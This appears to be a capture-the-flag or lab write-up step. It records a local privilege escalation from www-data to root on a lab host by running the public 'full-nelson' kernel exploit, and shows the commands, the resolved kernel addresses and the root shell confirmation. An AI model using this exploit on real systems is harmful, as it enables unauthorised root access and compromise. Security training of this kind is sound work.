# 8 privesc\_2 full-nelson

```
Using https://github.com/lucyoa/kernel-exploits/tree/master/full-nelson
www-data@offsecsrv:/tmp/k$ chmod +x full-nelson
www-data@offsecsrv:/tmp/k$ ./full-nelson
[*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf822f2d0
 [+] Resolved econet_ops to 0xf822f3c0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Calculating target...
[*] Triggering payload...
[*] Got root!
# whoami;id;hostname
root
uid=0(root) gid=0(root)
offsecsrv
```
